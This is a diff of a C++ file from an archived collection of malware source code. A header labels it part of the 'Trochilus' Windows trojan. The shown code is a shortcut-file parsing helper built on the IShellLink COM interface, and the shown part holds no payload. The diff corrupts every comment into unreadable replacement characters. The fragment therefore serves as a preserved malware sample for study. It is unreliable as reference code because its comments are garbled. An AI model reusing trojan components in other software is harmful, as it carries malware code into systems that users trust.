@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include <objbase.h>
 #include <shobjidl.h>
@@ -63,18 +74,18 @@ BOOL LnkUtils::QueryLnk( LPCTSTR lpLinkPath, tstring& strExePath, tstring& strEx
 {
 	IShellLink*	pShellLink;
 
-	// ÓÃIShellLink½Ó¿ÚÀ´½âÎölnkÎÄ¼þ
+	// ï¿½ï¿½IShellLinkï¿½Ó¿ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½lnkï¿½Ä¼ï¿½
 	// 
-	// ÓÃµ¥Ïß³Ì·½Ê½´´½¨COM¶ÔÏó
+	// ï¿½Ãµï¿½ï¿½ß³Ì·ï¿½Ê½ï¿½ï¿½ï¿½ï¿½COMï¿½ï¿½ï¿½ï¿½
 	BOOL bReturn = (::CoInitialize(NULL) == S_OK);
 	if(TRUE || bReturn)
 	{
 		bReturn = ::CoCreateInstance (CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
 			IID_IShellLink, (void **)&pShellLink) >= 0;
-		// °´CLSID_ShellLink±êÊ¶·û£¬´´½¨ÁËlnk½âÎöµÄCOM¶ÔÏó
+		// ï¿½ï¿½CLSID_ShellLinkï¿½ï¿½Ê¶ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½lnkï¿½ï¿½ï¿½ï¿½ï¿½ï¿½COMï¿½ï¿½ï¿½ï¿½
 		if(bReturn)
 		{
-			//¾ßÌåÇë²é¿´MSDN
+			//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½é¿´MSDN
 			IPersistFile *ppf;
 			bReturn = pShellLink->QueryInterface(IID_IPersistFile, (void **)&ppf) >= 0;
 			if(bReturn)
